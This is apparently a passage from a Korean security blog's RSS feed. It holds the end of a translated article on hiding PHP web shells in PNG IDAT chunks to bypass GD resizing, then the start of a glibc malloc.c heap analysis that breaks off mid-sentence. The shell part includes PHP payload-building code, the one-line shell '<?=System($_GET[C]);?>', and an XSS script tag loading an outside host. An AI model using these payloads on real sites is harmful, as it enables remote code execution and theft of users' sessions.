<span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">  $r = $p[$y];</span><br><span class="line">  $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">  $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">  $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">  imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img);</span><br></pre></td></tr></table></figure><p>이미지가 구성되면 검은 배경의 왼쪽 상단 모서리에 픽셀 문자열이 나타난다.</p><p><img src="https://www.idontplaydarts.com/images/shellcode1.png" alt="shellcod1"></p><p>이미지를 hex editor로 볼 때 쉘을 볼 수 있어야 한다:</p><p><img src="https://www.idontplaydarts.com/images/hexdumppngshell.png" alt="hexdumppngshell.png"><br><br><br></p><h3 id="Step-4-이미지-변환-우회"><a href="#Step-4-이미지-변환-우회" class="headerlink" title="Step 4. 이미지 변환 우회"></a>Step 4. 이미지 변환 우회</h3><p>IDAT chunk 에 웹쉘을 넣는 주된 이유는 리사이즈와 리샘플링 작업을 우회할 수 있기 때문이다. - PHP-GD는 이 <a href="https://www.php.net/manual/en/function.imagecopyresized.php" target="_blank" rel="noopener">imagecopyresized</a>와 <a href="https://www.php.net/manual/en/function.imagecopyresampled.php" target="_blank" rel="noopener">imagecopyresampled</a>를 수행하는 두 함수를 포함하고 있다.</p><p>Imagecopyresampled는 픽셀 그룹에서 평균 픽셀 값을 가져와 이미지를 변환하는데 이것을 우회하기 위해서는 payload를 일련의 직사각형 혹은 정사각형으로 인코딩해야 한다. 반면에 Imagecopyresized는 몇 픽셀마다 샘플링하여 이미지를 변환하므로 이 기능을 우회하기 위해서는 실제로 몇 픽셀만 변경하면 된다.</p><p><img src="https://www.idontplaydarts.com/images/resized-256x256.png" alien="left"><br>위에 있는 이미지는 imagecopyresize를 사용하여 32x32로 리사이즈할 때와 아래에 있는 이미지를 imagecopyresample을 사용하여 32x32로 리샘플링할 때 둘 다 웹쉘을 나타낸다.<br><img src="https://www.idontplaydarts.com/images/resampled-256x256.png" alien="right"><br><br><br></p><h3 id="몇-가지-결론"><a href="#몇-가지-결론" class="headerlink" title="몇 가지 결론"></a>몇 가지 결론</h3><p>IDAT chunk에 쉘을 배치하는 것은 몇 가지 큰 이점이 있으며 어플리케이션이 업로드된 이미지를 resize 혹은 re-encode 하는 대부분의 데이터 유효성 검사 기술을 우회해야 한다. 최종이미지가 PNG로 저장되는 한 당신은 위의 페이로드를 GIF나 JPEG로도 업로드할 수 있다.</p><p>쉘을 더욱 효과적으로 숨기고 업로드된 이미지에서 쉘을 찾는데 더 짧도록 사용할 수 있는 더 나은 기법이 있을 수 있으며, 아마도 그것을 막아야 하는 개발자로서 할 수 있는 것은 많지 않을 것이다.</p><p>JPEG와 같이 손실이 많은 형식으로 쉘을 인코딩하는 것은 상당히 어려울 수 있다 - 그러나 불가능하지는 않을 것이다.</p><hr><h3 id="업데이트-2015년-7월"><a href="#업데이트-2015년-7월" class="headerlink" title="업데이트 : 2015년 7월"></a>업데이트 : 2015년 7월</h3><p>만약 사용자가 제공하는 PNG 파일을 포함하는 http 응답의 content-type 필드를 제어할 수 있다면 다음의 payload가 유용할 수 있다. 다음의 스크립트 태그를 IDAT chunk로 인코딩한다 :</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScRiPT</span> <span class="attr">sRC</span>=<span class="string">//XQI.CC</span>&gt;</span><span class="tag">&lt;/<span class="name">SCrIpt</span>&gt;</span></span><br></pre></td></tr></table></figure><p>참조하는 스크립트는 custom payload를 삽입할 수 있는 GET 파라미터 zz의 내용을 실행한다. 그것은 당신의 target origin에 효과적으로 reflected XSS 엔드 포인트를 제공한다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.org/images/test.png?zz=alert(&quot;this is xss :(&quot;);</span><br></pre></td></tr></table></figure><p><br><br></p><h3 id="Related-work"><a href="#Related-work" class="headerlink" title="Related work"></a>Related work</h3><p>GD 라이브러리 함수를 우회하는 이미지에서 쉘을 인코딩하는데에 대한 다른 훌륭한 작업이 있었다.</p><ul><li><p>“&lt;?=System($_GET[C]);?&gt;”를 <a href="https://rdot.org/forum/showthread.php?t=2780" target="_blank" rel="noopener">imagecreatefromjpeg에서 살아남은 JPEG파일</a>로 인코딩하는데 성공한 이미지 (오류가 발생하지만 GD로 복구됨)</p></li><li><p>인코딩 전략이 약간 다른 <a href="https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromgif" target="_blank" rel="noopener">GIF</a>; payload는 이미지 본문이 아닌 GIF 헤더에 인코딩된다.</p></li></ul><p>PNG 다운로드 <a href="https://www.idontplaydarts.com/images/xsspng.png" target="_blank" rel="noopener">XSS Payload</a> | <a href="https://www.idontplaydarts.com/images/phppng.png" target="_blank" rel="noopener">PHP Payload</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/10/03/Web/%E3%84%B4%20Research/Encoding-Web-Shells-in-PNG-IDAT-chunks/#disqus_thread</comments>
    </item>
    
    <item>
      <title>malloc.c Analysis</title>
      <link>https://defenit.kr/2019/09/30/Pwn/%E3%84%B4%20Research/malloc/</link>
      <guid>https://defenit.kr/2019/09/30/Pwn/%E3%84%B4%20Research/malloc/</guid>
      <pubDate>Mon, 30 Sep 2019 14:17:48 GMT</pubDate>
      <description>
      
        
        
          &lt;!--
&gt; 이 글은 glibc 2.23 버전의 malloc.c 소스 코드를 분석하여 Heap 메모리의 관리와 malloc(), free() 의 동작 원리를 보고 어떤 방식으로 Exploit 할 수 있을지, mitigation이나 exploit 방법 
        
      
      </description>
      
      <content:encoded><![CDATA[<!--> 이 글은 glibc 2.23 버전의 malloc.c 소스 코드를 분석하여 Heap 메모리의 관리와 malloc(), free() 의 동작 원리를 보고 어떤 방식으로 Exploit 할 수 있을지, mitigation이나 exploit 방법 등을 연구하는 문서입니다.--><blockquote><p>본 문서에서 분석하는 malloc.c(glibc2.23) 소스 코드는 <a href="https://ftp.gnu.org/gnu/glibc/glibc-2.23.tar.gz" target="_blank" rel="noopener">여기</a>에서 다운로드 받을 수 있습니다.</p></blockquote><hr><h1 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h1><p><a href="#1-whats-heap">1. What’s Heap?</a></p><p><a href="#2-the-heap-chunk">2. The Heap Chunk</a></p><p><a href="#3-management-of-chunk--bin">3. Management of Chunk &amp; Bin</a></p><p><a href="#4-core-functions">4. Core Functions</a></p><p><a href="#5-error-checks">5. Error Checks</a></p><hr><h1 id="1-What’s-Heap"><a href="#1-What’s-Heap" class="headerlink" title="1. What’s Heap?"></a>1. What’s Heap?</h1><p>간략하게 설명하면, 프로그래머가 가변적으로 사용 가능한 메모리 영역이다.<br>이는 프로그래머가 유저 입력(또는 외부 입력)에 따라 유연하게 메모리를 사용할 수 있도록 도와준다.</p><p>아래와 같이 <code>#include &lt;stdlib.h&gt;</code>를 선언함으로써 <code>malloc()</code>과 <code>free()</code>함수로 동적 메모리를 사용할 수 있게 된다.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* ptr = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(32): [%p]\n"</span>, ptr);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">"ABCD"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"value: [%s]\n"</span>, ptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"free(ptr) success!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>glibc에서는 아래와 같이 <code>malloc()</code>과 <code>free()</code> 함수를 설명한다.</p><!--malloc(size_t n)최소 n바이트의 새로 할당된 청크의 포인터를 반환한다.만약 사용 가능한 공간이 없을 경우, null을 반환한다.추가적으로, 할당에 실패했을 시 errno는 ANSI C system에서 ENOMEM으로 설정된다.만약 n이 0이라면, malloc은 최소 크기의 청크를 반환한다.(최소 크기는 32비트 시스템에서 16바이트이며, 64비트 시스템에서 24 혹은 32바이트이다.)대부분의 시스템에서 size_t는 unsigned type이므로, 음수 값을 인자로 주면엄청나게 큰 크기의 요청으로 간주된다.할당 가능한 최대 크기는 각 시스템마다 다르지만, size_t의 최대 표현 가능 값보다작다.free(void* p)이전에 malloc 또는 realloc같은 관련 루틴으로 할당된,p가 가르키는 청크를 해제한다.이전에 moloc 또는 recalloc과 같은 관련 루틴을 사용하여 할당되었던 p로 가리킨 메모리 덩어리를 해제한다. p가 null이면 아무 효과도 없다. p가 이미 해방되었다면 임의(즉, 나쁜!) 효과를 가질 수 있다.mallopt를 사용하지 않는 한(mallopt 사용) 매우 큰 공간을 확보하면 시스템에 사용되지 않는 메모리를 되돌려주는 작동이 자동으로 트리거되어 프로그램 설치 공간이 감소한다.--><p><strong>malloc.c:525</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span></span><br><span class="line"><span class="comment">  if no space is available. Additionally, on failure, errno is</span></span><br><span class="line"><span class="comment">  set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span></span><br><span class="line"><span class="comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span></span><br><span class="line"><span class="comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span></span><br><span class="line"><span class="comment">  with negative arguments are interpreted as requests for huge amounts</span></span><br><span class="line"><span class="comment">  of space, which will often fail. The maximum supported value of n</span></span><br><span class="line"><span class="comment">  differs across systems, but is in all cases less than the maximum</span></span><br><span class="line"><span class="comment">  representable value of a size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">void</span>*  __libc_malloc(<span class="keyword">size_t</span>);</span><br><span class="line">libc_hidden_proto (__libc_malloc)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  free(void* p)</span></span><br><span class="line"><span class="comment">  Releases the chunk of memory pointed to by p, that had been previously</span></span><br><span class="line"><span class="comment">  allocated using malloc or a related routine such as realloc.</span></span><br><span class="line"><span class="comment">  It has no effect if p is null. It can have arbitrary (i.e., bad!)</span></span><br><span class="line"><span class="comment">  effects if p has already been freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless disabled (using mallopt), freeing very large spaces will</span></span><br><span class="line"><span class="comment">  when possible, automatically trigger operations that give</span></span><br><span class="line"><span class="comment">  back unused memory to the system, thus reducing program footprint.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">void</span>     __libc_free(<span class="keyword">void</span>*);</span><br><span class="line">libc_hidden_proto (__libc_free)</span><br></pre></td></tr></table></figure></p><p><code>malloc()</code>과 <code>free()</code> 함수는 개발자와 OS 사이에 효율적인 heap memory 관리를 가능하게 해주지만, 개발자가 할당한 메모리의 사용이 끝나면 정확하게 <code>free()</code> 함수를 통해 메모리를 해제해 줘야 하고, 해제한 메모리의 포인터는 즉각 폐기해야 한다. 이는 추후에 설명할 Use After Free 취약점과 관련이 있다.</p><hr><h1 id="2-The-Heap-Chunk"><a href="#2-The-Heap-Chunk" class="headerlink" title="2. The Heap Chunk"></a>2. The Heap Chunk</h1><p>청크는 Heap 메모리 관리를 위한 Heap 메모리 영역의 단위이다.<br>Heap 청크의 구조체는 아래와 같이 정의되어 있다.</p><p><strong>malloc.c:1105</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><strong>실제 할당된 청크</strong>의 레이아웃은 AsciiFlow로 아래와 같이 나타낼 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of previous chunk, <span class="keyword">if</span> allocated            | |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk, in bytes                       |M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             User data starts here...                          .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .             (malloc_usable_size() bytes)                      .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk                                     |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>위 레이아웃에서 프로그램에 반환되는 메모리 주소는 <code>mem</code>이지만, 그 이전에 <code>INTERNAL_SIZE_T * 2</code>크기의 헤더가 존재한다. (<code>INTERNAL_SIZE_T</code>는 내부적으로 <code>size_t</code>의 크기와 동일하게 연산된다.)</p><p><strong>할당 해제된 청크</strong>의 레이아웃은 아래와 같이 나타낼 수 있다.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of previous chunk                            |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    'head:' |             Size of chunk, in bytes                         |P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Forward pointer to next chunk in <span class="built_in">list</span>             |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Back pointer to previous chunk in <span class="built_in">list</span>            |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Unused space (may be 0 bytes long)                .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    'foot:' |             Size of chunk, in bytes                           |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></p><p>청크가 해제되면 <code>mem</code> 위치에 <code>fd</code>를 설정하고, <code>mem + sizeof(size_t)</code> 위치에 <code>bk</code>를 설정하게 된다.<br>할당 해제된 청크는 이 <code>fd</code>와 <code>bk</code>를 통해 <strong>이중 연결 리스트</strong>로 관리된다.</p><p>또한 청크 헤더의 <code>size</code>위치에 <code>M, P</code> 등의 값이 붙어있는데, 이는 Heap 메모리가 할당될 때 연산 효율을 위해 할당 크기를 <code>sizeof(size_t) * 2</code>(32비트에서 8바이트)로 정렬하기 때문에, <code>size</code> 비트 하위 3비트(1, 2, 4)의 위치에 플래그를 설정하게 된다.<br>청크 플래그는 3가지가 존재하며, 아래와 같다.</p><h3 id="P-PREV-INUSE"><a href="#P-PREV-INUSE" class="headerlink" title="P (PREV_INUSE)"></a>P (PREV_INUSE)</h3><p>이전 청크(연결 리스트의 이전 인덱스가 아닌, 물리적 메모리로 가장 인접한 청크)가 할당 해제된 상태일 때 0, 사용중일 때 1로 설정된다.</p><p><strong>malloc.c:1269</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure></p><h3 id="M-IS-MMAPPED"><a href="#M-IS-MMAPPED" class="headerlink" title="M (IS_MMAPPED)"></a>M (IS_MMAPPED)</h3><p>해당 청크가 <code>mmap()</code> 함수를 통해 할당되었는지 여부를 표시한다.<br>이 플래그가 설정되었을 경우, 다른 두가지의 플래그를 무시한다.</p><p><strong>malloc.c:1276</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check for mmap()'ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span></span><br></pre></td></tr></table></figure></p><h3 id="A-NON-MAIN-ARENA"><a href="#A-NON-MAIN-ARENA" class="headerlink" title="A (NON_MAIN_ARENA)"></a>A (NON_MAIN_ARENA)</h3><p>해당 청크가 main arena에 속해있을 경우 0으로 설정된다.<br>쓰레드가 생성될 때 마다 각각의 arena가 할당되며, 해당 arena에서 청크를 관리하게 되는데, 이때 1로 설정된다.</p><p><strong>malloc.c:1283</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check for chunk from non-main arena */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure></p><hr><h1 id="3-Management-of-Chunk-amp-Bin"><a href="#3-Management-of-Chunk-amp-Bin" class="headerlink" title="3. Management of Chunk &amp; Bin"></a>3. Management of Chunk &amp; Bin</h1><p>Heap은 할당 해제된 청크들의 효율적인 관리를 위해 <code>bin</code>이라는 이름의 단일/이중 연결 리스트를 사용한다.<br>bin은 할당 해제된 청크의 크기에 따라 크게 4가지로 분류된다.</p><ol><li>Fast bin</li><li>Unsorted bin</li><li>Small bin</li><li>Large bin</li></ol><p>모든 bin은 쓰레드마다 할당되는 <code>arena</code>에 의해 관리되며, <code>arena</code> 구조체는 아래와 같이 정의되어 있다.</p><p><strong>malloc.c:1686</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>위 <code>arena</code>에서 <code>Fast bin</code>은 아래와 같이 선언되어 있다.</p><p><strong>malloc.c:1694</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Fastbins */</span></span><br><span class="line">mfastbinptr fastbinsY[NFASTBINS];</span><br></pre></td></tr></table></figure></p><p><code>Unsorted bin</code>, <code>Small bin</code>, <code>Large bin</code>은 아래와 같이 선언되어 있다.</p><p><strong>malloc.c:1703</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br></pre></td></tr></table></figure></p><h2 id="3-1-Fast-bin"><a href="#3-1-Fast-bin" class="headerlink" title="3-1. Fast bin"></a>3-1. Fast bin</h2><p><code>16~88 Byte</code>의 크기를 가지는 청크의 경우, <code>Fast bin</code>으로 관리된다.<br><code>Fast bin</code>은 다른 bins와 다르게 단일 연결 리스트로 관리(<code>fd</code> 필드만 사용)되며, 후입선출(LIFO) 방식으로 관리된다.<br><code>Fast bin</code>은 인접한 2개의 청크를 병합하지 않는다. 이로 인해 해제 속도가 빠르지만, 단편화(fragmentation) 가능성이 존재한다.</p><h2 id="3-2-Unsorted-bin"><a href="#3-2-Unsorted-bin" class="headerlink" title="3-2. Unsorted bin"></a>3-2. Unsorted bin</h2><p><code>Small bin</code>과 <code>Large bin</code>에 들어가야 할 크기의 청크가 해제되었을 때, 바로 <code>Small/Large Bin</code>에 들어가는 것이 아닌, <code>Unsorted bin</code>에 저장이 되어 최근 해제한 청크를 빠르게 재사용 가능(캐시 비슷한 역할)하게 만든다.</p><h2 id="3-3-Small-bin"><a href="#3-3-Small-bin" class="headerlink" title="3-3. Small bin"></a>3-3. Small bin</h2><p><code>16~504 Byte</code>의 크기를 가지는 청크의 경우, <code>Small bin</code>으로 관리된다.<br>환형 이중 연결 리스트로 관리(<code>fd</code>, <code>bk</code> 모두 사용)되며, 